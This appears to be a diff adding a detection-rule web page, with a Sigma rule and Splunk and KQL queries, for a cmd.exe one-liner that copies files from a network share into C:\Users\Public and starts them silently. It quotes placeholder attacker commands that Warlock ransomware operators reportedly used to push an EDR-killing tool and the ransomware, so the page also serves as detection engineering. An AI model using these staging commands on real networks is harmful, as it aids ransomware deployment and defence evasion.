@@ -1,0 +1,138 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Cmd Copies Files From Network Share To Users Public And Starts Them In Background · eeps-sigma</title>
+<meta name="description" content="Detects a cmd.exe one-liner that copies files from a UNC share and then launches an executable from C:\Users\Public with start /B cmd /c &quot;... 2&gt;nul || exit&quot;.">
+<meta property="og:title" content="Cmd Copies Files From Network Share To Users Public And Starts Them In Background · eeps-sigma">
+<meta property="og:description" content="Detects a cmd.exe one-liner that copies files from a UNC share and then launches an executable from C:\Users\Public with start /B cmd /c &quot;... 2&gt;nul || exit&quot;.">
+<meta name="author" content="Esmond Er">
+<link rel="icon" href="../assets/favicon.svg" type="image/svg+xml">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/style.css">
+<script>try{var t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;}catch(_){}</script>
+</head>
+<body>
+<header class="nav">
+  <div class="wrap nav-in">
+    <a class="brand" href="../index.html"><span class="mark" aria-hidden="true">Σ</span>eeps-sigma</a>
+    <nav>
+      <a href="../index.html#rules">Rules</a>
+      <a href="../index.html#approach">Approach</a>
+      <a href="../index.html#about">About</a>
+      <a href="https://github.com/aienthues/eeps-sigma" rel="noopener">GitHub</a>
+      <button class="theme" type="button" aria-label="Toggle colour theme" data-theme-toggle><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 3a9 9 0 0 0 0 18z" fill="currentColor"/></svg></button>
+    </nav>
+  </div>
+</header>
+<main>
+
+<section class="rule-hero">
+  <div class="wrap">
+    <nav class="crumbs" aria-label="Breadcrumb"><a href="../index.html#rules">Rules</a><span>/</span><span>Windows</span><span>/</span><span>process creation</span></nav>
+    <h1>Cmd Copies Files From Network Share To Users Public And Starts Them In Background</h1>
+    <div class="badges"><span class="lvl lvl-high">High</span><span class="pill">Experimental</span><span class="pill">Windows · process creation</span></div>
+    <div class="cta">
+      <a class="btn" href="https://raw.githubusercontent.com/aienthues/eeps-sigma/main/rules/windows/process_creation/proc_creation_win_cmd_copy_from_share_to_users_public_and_start_background.yml" download>Download .yml</a>
+      <a class="btn btn-ghost" href="https://github.com/aienthues/eeps-sigma/blob/main/rules/windows/process_creation/proc_creation_win_cmd_copy_from_share_to_users_public_and_start_background.yml" rel="noopener">View on GitHub</a>
+    </div>
+  </div>
+</section>
+
+<div class="wrap rule-grid">
+  <article class="rule-main">
+    <section>
+      <h2>What it detects</h2>
+      <p>Detects a cmd.exe one-liner that copies files from a UNC share and then launches an executable from C:\Users\Public with start /B cmd /c &quot;... 2&gt;nul || exit&quot;.</p>
+    </section>
+    <section><h2>Why this rule exists</h2><p>Symantec reports that the Warlock ransomware attackers pushed an AV/EDR-killing tool with net use \\[IP_ADDRESS] ... &amp; copy \\[IP_ADDRESS]\av\* CSIDL_PROFILE\public /y &amp; start /B cmd /c &quot;c:\users\public\a.exe log 2&gt;nul || exit&quot; and deployed the ransomware with copy \\[REMOVED]\SYSVOL\[VICTIM DOMAIN]\scripts\run\* CSIDL_PROFILE\public /y &amp; start /B cmd /c &quot;c:\users\public\run.exe 2&gt;nul || exit&quot;.</p></section>
+    <section>
+      <h2>Detection logic</h2>
+      <div class="tabs" role="tablist"><button type="button" role="tab" class="tab on" data-tab="0" aria-selected="true">Sigma</button><button type="button" role="tab" class="tab" data-tab="1" aria-selected="false">Splunk SPL</button><button type="button" role="tab" class="tab" data-tab="2" aria-selected="false">KQL · Defender XDR</button></div>
+      <div class="pane" data-pane="0"><div class="code-meta"><span>Rule source</span><button type="button" class="copy" data-copy>Copy</button></div><pre class="code"><code><span class="y-key">title</span>: Cmd Copies Files From Network Share To Users Public And Starts Them In Background
+<span class="y-key">id</span>: b3539851-505b-4103-a0a9-06b7ad361df4
+<span class="y-key">status</span>: experimental
+<span class="y-key">description</span>: |
+    Detects a cmd.exe one-liner that copies files from a UNC share and then launches an executable from C:\Users\Public with start /B cmd /c <span class="y-str">&quot;... 2&gt;nul || exit&quot;</span>.
+    Symantec reports that the Warlock ransomware attackers pushed an AV/EDR-killing tool with
+    net use \\[IP_ADDRESS] ... &amp; copy \\[IP_ADDRESS]\av\* CSIDL_PROFILE\public /y &amp; start /B cmd /c <span class="y-str">&quot;c:\users\public\a.exe log 2&gt;nul || exit&quot;</span>
+    and deployed the ransomware with copy \\[REMOVED]\SYSVOL\[VICTIM DOMAIN]\scripts\run\* CSIDL_PROFILE\public /y &amp; start /B cmd /c <span class="y-str">&quot;c:\users\public\run.exe 2&gt;nul || exit&quot;</span>.
+<span class="y-key">references</span>:
+<span class="y-dash">    -</span> https://www.security.com/threat-intelligence/warlock-ransomware-critical-infrastructure
+<span class="y-key">author</span>: Esmond Er
+<span class="y-key">date</span>: 2026-10-04
+<span class="y-key">modified</span>: 2026-10-04
+<span class="y-key">tags</span>:
+<span class="y-dash">    -</span> attack.lateral-movement
+<span class="y-dash">    -</span> attack.t1570
+<span class="y-dash">    -</span> attack.execution
+<span class="y-dash">    -</span> attack.t1059.003
+<span class="y-key">logsource</span>:
+    <span class="y-key">category</span>: process_creation
+    <span class="y-key">product</span>: windows
+<span class="y-key">detection</span>:
+    <span class="y-key">selection_img</span>:
+        - <span class="y-key">Image</span><span class="y-mod">|endswith</span>: <span class="y-str">&#x27;\cmd.exe&#x27;</span>
+        - <span class="y-key">OriginalFileName</span>: <span class="y-str">&#x27;Cmd.Exe&#x27;</span>
+    <span class="y-key">selection_cli</span>:
+        <span class="y-key">CommandLine</span><span class="y-mod">|contains|all</span>:
+<span class="y-dash">            -</span> <span class="y-str">&#x27;copy \\\\&#x27;</span>
+<span class="y-dash">            -</span> <span class="y-str">&#x27;start /B cmd /c&#x27;</span>
+<span class="y-dash">            -</span> <span class="y-str">&#x27;\users\public\&#x27;</span>
+<span class="y-dash">            -</span> <span class="y-str">&#x27;2&gt;nul || exit&#x27;</span>
+    <span class="y-key">condition</span>: all of selection_*
+<span class="y-key">falsepositives</span>:
+<span class="y-dash">    -</span> Software deployment or logon scripts that stage an installer from a file share into C:\Users\Public and start it silently in the background
+<span class="y-key">level</span>: high</code></pre></div><div class="pane" data-pane="1" hidden><div class="code-meta"><span>Sysmon + Splunk Windows field mapping</span><button type="button" class="copy" data-copy>Copy</button></div><pre class="code"><code>source=&quot;WinEventLog:Microsoft-Windows-Sysmon/Operational&quot; EventCode=1 Image=&quot;*\\cmd.exe&quot; OR OriginalFileName=&quot;Cmd.Exe&quot; CommandLine=&quot;*copy \\\\*&quot; CommandLine=&quot;*start /B cmd /c*&quot; CommandLine=&quot;*\\users\\public\\*&quot; CommandLine=&quot;*2&gt;nul || exit*&quot;</code></pre></div><div class="pane" data-pane="2" hidden><div class="code-meta"><span>Microsoft Defender XDR advanced hunting</span><button type="button" class="copy" data-copy>Copy</button></div><pre class="code"><code>DeviceProcessEvents
+| where (FolderPath endswith &quot;\\cmd.exe&quot; or ProcessVersionInfoOriginalFileName =~ &quot;Cmd.Exe&quot;) and (ProcessCommandLine contains &quot;copy \\\\&quot; and ProcessCommandLine contains &quot;start /B cmd /c&quot; and ProcessCommandLine contains &quot;\\users\\public\\&quot; and ProcessCommandLine contains &quot;2&gt;nul || exit&quot;)</code></pre></div>
+      <p class="muted small">Backend queries are generated with pySigma as a starting point. Field names and index or table names depend on your environment; verify before deploying.</p>
+    </section>
+    <section>
+      <h2>False positives &amp; tuning</h2>
+      <ul class="bullets"><li>Software deployment or logon scripts that stage an installer from a file share into C:\Users\Public and start it silently in the background</li></ul>
+    </section>
+  </article>
+
+  <aside class="rule-side">
+    <div class="panel">
+      <h3>ATT&amp;CK</h3>
+      <div class="tac"><span class="chip chip-soft">Lateral Movement</span> <span class="chip chip-soft">Execution</span></div>
+      <ul class="plain"><li><a href="https://attack.mitre.org/techniques/T1570/" rel="noopener"><span class="chip">T1570</span></a> Lateral Tool Transfer</li><li><a href="https://attack.mitre.org/techniques/T1059/003/" rel="noopener"><span class="chip">T1059.003</span></a> Command and Scripting Interpreter: Windows Command Shell</li></ul>
+    </div>
+    <div class="panel">
+      <h3>Log source</h3>
+      <dl class="kv"><div><dt>Category</dt><dd>process_creation</dd></div><div><dt>Product</dt><dd>windows</dd></div></dl>
+    </div>
+    <div class="panel">
+      <h3>Source intelligence</h3>
+      <ul class="plain refs"><li><a href="https://www.security.com/threat-intelligence/warlock-ransomware-critical-infrastructure" rel="noopener">security.com</a><span class="muted small ref-url">https://www.security.com/threat-intelligence/warlock-ransomware-critical-infrastructure</span></li></ul>
+    </div>
+    <div class="panel">
+      <h3>Metadata</h3>
+      <dl class="kv">
+        <div><dt>Rule ID</dt><dd class="mono">b3539851-505b-4103-a0a9-06b7ad361df4</dd></div>
+        <div><dt>Created</dt><dd>2026-10-04</dd></div>
+        <div><dt>Modified</dt><dd>2026-10-04</dd></div>
+        <div><dt>Author</dt><dd>Esmond Er</dd></div>
+      </dl>
+    </div>
+    
+  </aside>
+</div>
+
+</main>
+<footer class="foot">
+  <div class="wrap foot-in">
+    <div>
+      <strong>eeps-sigma</strong> · by Esmond Er<br>
+      <span class="muted">Rules released under the <a href="https://github.com/aienthues/eeps-sigma/blob/main/LICENSE.md">Detection Rule License 1.1</a>. Experimental rules: test and tune in your environment before production use.</span>
+    </div>
+    <p class="muted small">Research triage and first drafts are AI-assisted. Every rule is traced to a primary source, passes automated schema, compile and ATT&amp;CK checks, and is independently reviewed before it is published here.</p>
+  </div>
+</footer>
+<script src="../assets/site.js"></script>
+</body>
+</html>
